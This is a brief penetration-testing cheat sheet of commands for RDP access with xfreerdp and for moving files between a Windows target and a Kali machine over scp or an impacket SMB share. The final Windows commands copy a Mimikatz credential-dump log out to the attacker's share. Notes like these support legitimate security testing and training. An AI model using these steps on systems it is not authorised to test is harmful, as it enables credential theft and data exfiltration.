# Using RDP
```
xfreerdp /u:{username} /p:{password} /v:{ip of device}

if need to transfer files, xfreerdp /u:{username} /p:{password} /v:{ip of device} +drive:testfolder,/Documents
```
## Transferring Files from Windows to Kali
```
scp [filename] (user)@$ip:[home directory of user]
```
OR
Through SMB
On Kali:
```
impacket-smbserver test . -smb2support  -username kali -password kali
```
On Windows:
```
net use m: \\Kali_IP\test /user:kali kali
copy mimikatz.log m:\
```
